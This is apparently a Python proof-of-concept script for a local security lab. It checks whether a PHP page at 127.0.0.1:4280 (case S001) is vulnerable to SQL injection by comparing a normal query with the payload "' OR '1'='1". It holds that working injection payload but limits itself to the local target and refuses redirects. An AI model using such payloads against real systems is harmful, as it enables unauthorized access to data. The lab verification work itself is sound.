#!/usr/bin/env python3
import re
import sys
from html.parser import HTMLParser
from urllib.parse import quote
from urllib.request import Request, build_opener, HTTPRedirectHandler
from urllib.error import HTTPError, URLError

BASE = "http://127.0.0.1:4280"
TARGET = BASE + "/lab_cases/S001/index.php"
TIMEOUT = 5

EXPECTED_NORMAL = {(1, "Alice")}
EXPECTED_TEST = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
TEST_INPUT = "' OR '1'='1"


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class ParagraphParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.in_p = False
        self.buf = []
        self.paragraphs = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "p":
            self.in_p = True
            self.buf = []

    def handle_endtag(self, tag):
        if tag.lower() == "p" and self.in_p:
            self.paragraphs.append("".join(self.buf).strip())
            self.in_p = False

    def handle_data(self, data):
        if self.in_p:
            self.buf.append(data)


def parse_records(html):
    parser = ParagraphParser()
    parser.feed(html)
    records = []
    for text in parser.paragraphs:
        m = re.match(r"^ID\s+(\d+)[：:]\s*(.*)$", text)
        if m:
            records.append((int(m.group(1)), m.group(2).strip()))
    return set(records)


def fetch_records(name):
    url = TARGET + "?name=" + quote(name, safe="")
    req = Request(url, headers={"User-Agent": "S001-local-audit-poc"})
    opener = build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=TIMEOUT) as resp:
            status = getattr(resp, "status", 200)
            final_url = resp.geturl()
            body = resp.read().decode("utf-8", "replace")
    except HTTPError as e:
        if 300 <= e.code < 400:
            raise RuntimeError("拒绝重定向；未跟随到其他主机或路径") from e
        raise RuntimeError(f"HTTP 错误: {e.code}") from e
    except URLError as e:
        raise RuntimeError(f"无法访问本地目标: {e}") from e

    if not final_url.startswith(BASE + "/"):
        raise RuntimeError(f"最终 URL 超出固定本地目标范围: {final_url}")
    if status != 200:
        raise RuntimeError(f"非 200 响应，不能据此判断: {status}")
    return parse_records(body)


def main():
    try:
        normal = fetch_records("Alice")
        test = fetch_records(TEST_INPUT)
    except Exception as e:
        print(f"无法判断：{e}")
        print("请检查：目标仅应为 127.0.0.1:4280；应用可访问；db_connect.php 正常；lab_people 已初始化；无代理/重定向干扰。")
        return 2

    print(f"普通对照 name=Alice 解析记录: {sorted(normal)}")
    print(f"测试输入 name={TEST_INPUT!r} 解析记录: {sorted(test)}")

    if normal != EXPECTED_NORMAL:
        print("无法判断：普通业务对照不符合预期。")
        print("请检查入口可达性、common/db_connect.php、lab_people 预置数据 (1 Alice, 2 Bob, 3 Carol)、查询错误显示。")
        return 3

    if test == EXPECTED_TEST and test != normal and {(2, "Bob"), (3, "Carol")}.issubset(test):
        print("验证成功：测试请求解析到超出普通精确匹配的实际业务记录集合，SQL 条件被输入改变。")
        print("安全影响观察：浏览器测试 URL 应显示 Alice、Bob、Carol 三条记录；数据库 lab_people 内容不应发生变化。")
        return 0

    print("未能确认漏洞：测试请求未返回预期记录集合。")
    print("请检查 URL 编码、代理/重定向、应用实际代码是否与样本一致、mysqli 错误处理是否导致页面查询失败。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
